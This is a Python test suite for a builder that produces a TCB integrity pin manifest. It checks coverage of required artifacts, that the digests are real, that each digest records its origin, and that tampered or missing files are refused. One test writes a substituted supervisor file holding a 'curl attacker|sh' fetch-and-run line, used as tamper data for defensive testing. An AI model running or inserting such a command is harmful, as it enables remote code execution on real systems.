"""The live kit's §2.5 TCB pin manifest must COVER the required set (audit F-10).

`verify_tcb_integrity` refuses an under-specified manifest, because an artifact that is not listed is
never integrity-checked. So the manifest builder falling behind `TCB_REQUIRED_ARTIFACTS` would not be
a silent hole — it would be a hard refusal at every live turn, discovered only on Linux CI. These
tests catch it here instead, and pin the two properties that make the manifest meaningful: every
required role is present, and every entry is a real digest of a real file.
"""

from __future__ import annotations

import contextlib
import hashlib
import importlib.util
import io
import json
import os
import re
import subprocess
import sys
import tempfile
import unittest

TESTS_DIR = os.path.dirname(os.path.abspath(__file__))
if TESTS_DIR not in sys.path:
    sys.path.insert(0, TESTS_DIR)
ENGINE_ROOT = os.path.dirname(TESTS_DIR)
REPO_ROOT = os.path.dirname(ENGINE_ROOT)
# Derived from the engine tree, not from REPO_ROOT/"engine": the builder ships INSIDE
# engine/, so it is present wherever the engine is -- a deployed tree, or a checkout in
# which engine/ is itself the root (engine/.github/workflows/verify.yml runs that way).
# Spelling it REPO_ROOT/engine/... made the two tests that need only the builder depend
# on the engine sitting one level down.
BUILDER = os.path.join(ENGINE_ROOT, "ci", "live", "build_tcb_pin_manifest.py")
TCB_INTEGRITY_RS = os.path.join(
    REPO_ROOT, "apps", "desktop", "src-tauri", "core", "src", "tcb_integrity.rs")

from _prerequisites import DESKTOP_TCB_SOURCE, requires  # noqa: E402


def required_artifacts() -> list[str]:
    """The `TCB_REQUIRED_ARTIFACTS` list, read from the Rust source that defines it.

    Read rather than duplicated: a copy here would drift, and a drifted copy would assert that the
    manifest covers a set nobody enforces.
    """
    with open(TCB_INTEGRITY_RS, "r", encoding="utf-8") as f:
        source = f.read()
    body = source.split("pub const TCB_REQUIRED_ARTIFACTS: &[&str] = &[", 1)[1].split("];", 1)[0]
    return re.findall(r'"([^"]+)"', body)


#: The repo-sourced roles and the source-relative path each is staged from. Read from the builder
#: rather than copied, so a role moving between "has an origin" and "self-measured" cannot drift
#: past these tests unnoticed.
def source_origin() -> dict:
    with open(BUILDER, "r", encoding="utf-8") as f:
        source = f.read()
    body = source.split("SOURCE_ORIGIN = {", 1)[1].split("}", 1)[0]
    return dict(re.findall(r'"([^"]+)":\s*"([^"]+)"', body))


class LiveTcbPinManifestTests(unittest.TestCase):
    def _stage_source(self, root: str, live: str) -> str:
        """The tree the kit was staged FROM: a separate directory whose repo-sourced files are
        byte-identical to the installed copies, which is what a clean install produces.

        It is a sibling of the deployment root rather than a subdirectory of it, because a source
        tree living inside the tree it vouches for is not an independent origin.
        """
        source = os.path.join(os.path.dirname(os.path.normpath(root)), "source-tree")
        for logical, relative in source_origin().items():
            del logical
            target = os.path.join(source, *relative.split("/"))
            os.makedirs(os.path.dirname(target), exist_ok=True)
            if relative.endswith("run_live_turn.sh"):
                # Both `.unit` roles pin a root-owned COPY of the orchestrator, so the source file
                # must carry the unit's bytes.
                payload = "content of brops-live.unit"
            else:
                payload = "content of " + os.path.basename(relative)
            with open(target, "w", encoding="utf-8") as f:
                f.write(payload)
        del live
        return source

    def _kit(self, root: str) -> tuple[str, str]:
        """Lay out the file set the builder expects, with distinguishable contents."""
        live = os.path.join(root, "engine", "ci", "live")
        for d in (os.path.join(root, "tcb"), os.path.join(root, "bin"), live):
            os.makedirs(d, exist_ok=True)
        files = [
            os.path.join(live, "run_supervisor.py"),
            os.path.join(live, "run_signer.py"),
            os.path.join(live, "run_authority.py"),
            os.path.join(root, "bin", "governed_recorder"),
            os.path.join(root, "bin", "live_turn"),
            os.path.join(root, "tcb", "privileged-launcher.bin"),
            os.path.join(root, "tcb", "contained-executor.bin"),
            os.path.join(root, "tcb", "executor.lease"),
            os.path.join(root, "tcb", "root-anchor.json"),
            # The recorder's policy is now what `evidence-recorder-runner.config` pins: the
            # recorder reads its paths and pins from here, never from argv, so this is the file
            # whose integrity actually steers the privileged execution (audit round 3, the
            # recorder identity-borrow finding).
            os.path.join(root, "tcb", "recorder-policy.json"),
            os.path.join(root, "tcb", "desktop-challenge-authority.ipc-policy.json"),
            os.path.join(root, "tcb", "trusted-verifier-broker.ipc-policy.json"),
            os.path.join(root, "config.json"),
        ]
        for path in files:
            with open(path, "w", encoding="utf-8") as f:
                f.write("content of " + os.path.basename(path))
        sudoers = os.path.join(root, "sudoers")
        unit = os.path.join(root, "tcb", "brops-live.unit")
        for path in (sudoers, unit):
            with open(path, "w", encoding="utf-8") as f:
                f.write("content of " + os.path.basename(path))
        self._stage_source(root, live)
        return sudoers, unit

    def _run_builder(self, root: str, sudoers: str, unit: str, out: str,
                     source: str | None = None) -> subprocess.CompletedProcess:
        if source is None:
            source = os.path.join(os.path.dirname(os.path.normpath(root)), "source-tree")
        return subprocess.run(
            [sys.executable, BUILDER, "--root-dir", root, "--source-dir", source,
             "--sudoers", sudoers, "--unit", unit, "--out", out],
            capture_output=True, text=True)

    def _build(self, root: str) -> dict:
        sudoers, unit = self._kit(root)
        out = os.path.join(root, "tcb", "tcb-pin-manifest.json")
        r = self._run_builder(root, sudoers, unit, out)
        self.assertEqual(r.returncode, 0, r.stderr)
        with open(out, "r", encoding="utf-8") as f:
            return json.load(f)

    @requires(DESKTOP_TCB_SOURCE)
    def test_the_manifest_covers_every_required_artifact(self):
        """Cross-tree agreement: engine's builder against the Rust TCB's required set.

        This is an assertion about the SOURCE REPOSITORY -- the required list is read
        from apps/desktop rather than copied, precisely so it cannot drift -- and
        deployment Step 6 copies engine/ alone. Without the Rust source there is no
        required set to compare against, so the test says so by name instead of
        raising FileNotFoundError at a reader four frames down.
        """
        with tempfile.TemporaryDirectory() as root:
            manifest = self._build(root)
            listed = {a["logical_name"] for a in manifest["artifacts"]}
            missing = [name for name in required_artifacts() if name not in listed]
            self.assertEqual(missing, [], "these roles would make verify_tcb_integrity refuse")

    def test_every_pin_is_a_real_digest_of_the_file_it_names(self):
        # A manifest of plausible-looking constants would pass the coverage floor and fail every
        # content check on Linux — worse than no manifest, because it looks like coverage.
        #
        # NOTE what this test does NOT prove, and used to be read as proving: that the digests
        # AGREE with the installed files says nothing about where the digests came from. When every
        # one of them was computed by hashing the file it pinned, this assertion was a tautology.
        # `test_a_substituted_repo_artifact_is_refused_rather_than_pinned` is the one that has
        # teeth.
        with tempfile.TemporaryDirectory() as root:
            manifest = self._build(root)
            for artifact in manifest["artifacts"]:
                with open(artifact["path"], "rb") as f:
                    self.assertEqual(
                        artifact["expected_sha256"], hashlib.sha256(f.read()).hexdigest(),
                        artifact["logical_name"])
                self.assertEqual(artifact["expected_owner"], "root")
            self.assertEqual(manifest["owner_uids"], {"root": 0, "brops_admin": 0})

    def test_every_pin_declares_where_its_digest_came_from(self):
        # The §2.5 floor is a content pin, and a content pin is only as good as the ORIGIN of the
        # number. The manifest has to be readable as which-is-which, or an auditor cannot tell a
        # pin from the tree measuring itself.
        with tempfile.TemporaryDirectory() as root:
            manifest = self._build(root)
            origins = source_origin()
            self.assertTrue(origins, "the builder declares no repo-sourced artifact at all")
            independent = 0
            for artifact in manifest["artifacts"]:
                origin = artifact["digest_origin"]
                if artifact["logical_name"] in origins:
                    self.assertEqual(
                        origin, "source:" + origins[artifact["logical_name"]],
                        artifact["logical_name"])
                    independent += 1
                else:
                    self.assertEqual(origin, "deployment-measured", artifact["logical_name"])
            self.assertEqual(manifest["digest_origin_counts"]["source"], independent)
            self.assertEqual(
                manifest["digest_origin_counts"]["deployment-measured"],
                len(manifest["artifacts"]) - independent)
            self.assertGreater(independent, 0)

    def test_a_substituted_repo_artifact_is_refused_rather_than_pinned(self):
        # THE reproduction. Every `expected_sha256` used to be computed by hashing the very file it
        # pinned, in the same root shell that had installed it — so an artifact substituted BEFORE
        # the pin was taken was pinned at its substituted digest and the later §2.5 check verified
        # it happily. Driven against the old builder this returned 0 and emitted a manifest whose
        # supervisor pin WAS the attacker's bytes.
        with tempfile.TemporaryDirectory() as root:
            sudoers, unit = self._kit(root)
            victim = os.path.join(root, "engine", "ci", "live", "run_supervisor.py")
            with open(victim, "w", encoding="utf-8") as f:
                f.write("import os; os.system('curl attacker|sh')")
            out = os.path.join(root, "m.json")
            r = self._run_builder(root, sudoers, unit, out)
            self.assertNotEqual(r.returncode, 0, r.stdout)
            self.assertIn("supervisor.bin", r.stderr)
            self.assertIn("the source it was staged from", r.stderr)
            self.assertFalse(os.path.exists(out), "a refused build must emit no manifest")

    def test_a_missing_source_origin_is_refused_not_self_measured(self):
        # The failure mode the required argument exists to prevent: falling back to hashing the
        # deployment copy when the origin cannot be found is exactly the defect, quietly restored.
        with tempfile.TemporaryDirectory() as root:
            sudoers, unit = self._kit(root)
            source = os.path.join(os.path.dirname(os.path.normpath(root)), "source-tree")
            os.remove(os.path.join(source, "engine", "ci", "live", "run_signer.py"))
            out = os.path.join(root, "m.json")
            r = self._run_builder(root, sudoers, unit, out)
            self.assertNotEqual(r.returncode, 0, r.stdout)
            self.assertIn("isolated-signer.bin", r.stderr)
            self.assertFalse(os.path.exists(out))

    def test_the_builder_refuses_without_a_source_tree(self):
        with tempfile.TemporaryDirectory() as root:
            sudoers, unit = self._kit(root)
            out = os.path.join(root, "m.json")
            r = self._run_builder(root, sudoers, unit, out,
                                  source=os.path.join(root, "does-not-exist"))
            self.assertNotEqual(r.returncode, 0, r.stdout)
            self.assertIn("--source-dir", r.stderr)
            self.assertFalse(os.path.exists(out))

    def test_a_manifest_with_no_independent_digest_at_all_is_refused(self):
        # If `SOURCE_ORIGIN` were ever emptied, every pin would go back to being the tree hashing
        # itself and every test above would still pass — the roles would simply all be
        # "deployment-measured". This is the guard that makes that state a refusal instead of a
        # silent return to the defect, so it is driven with the map emptied.
        builder = importlib.util.spec_from_file_location("build_tcb_pin_manifest", BUILDER)
        module = importlib.util.module_from_spec(builder)
        builder.loader.exec_module(module)
        with tempfile.TemporaryDirectory() as root:
            sudoers, unit = self._kit(root)
            source = os.path.join(os.path.dirname(os.path.normpath(root)), "source-tree")
            out = os.path.join(root, "m.json")
            argv = [BUILDER, "--root-dir", root, "--source-dir", source,
                    "--sudoers", sudoers, "--unit", unit, "--out", out]
            saved_map, saved_argv = module.SOURCE_ORIGIN, sys.argv
            stderr = io.StringIO()
            try:
                module.SOURCE_ORIGIN = {}
                sys.argv = argv
                with contextlib.redirect_stderr(stderr), contextlib.redirect_stdout(io.StringIO()):
                    rc = module.main()
            finally:
                module.SOURCE_ORIGIN, sys.argv = saved_map, saved_argv
            self.assertEqual(rc, 1)
            self.assertIn("not one pinned digest has an origin outside", stderr.getvalue())
            self.assertFalse(os.path.exists(out))

    def test_the_live_kit_passes_the_source_tree_to_the_builder(self):
        # A required argument nothing passes is a kit that cannot provision, discovered on Linux
        # CI. Assert the wiring here, where the message is about the wiring.
        kit = os.path.join(ENGINE_ROOT, "ci", "live", "run_live_turn.sh")
        with open(kit, "r", encoding="utf-8") as f:
            script = f.read()
        invocation = [line for line in script.splitlines()
                      if "build_tcb_pin_manifest.py" in line and line.startswith("python3")]
        self.assertEqual(len(invocation), 1, invocation)
        self.assertIn('--source-dir "$REPO_ROOT"', invocation[0])

    def test_a_missing_artifact_fails_the_build_instead_of_being_skipped(self):
        with tempfile.TemporaryDirectory() as root:
            sudoers, unit = self._kit(root)
            os.remove(os.path.join(root, "tcb", "root-anchor.json"))
            r = self._run_builder(root, sudoers, unit, os.path.join(root, "m.json"))
            self.assertNotEqual(r.returncode, 0)
            self.assertIn("key-manifest.root-anchor", r.stderr)


if __name__ == "__main__":
    unittest.main()
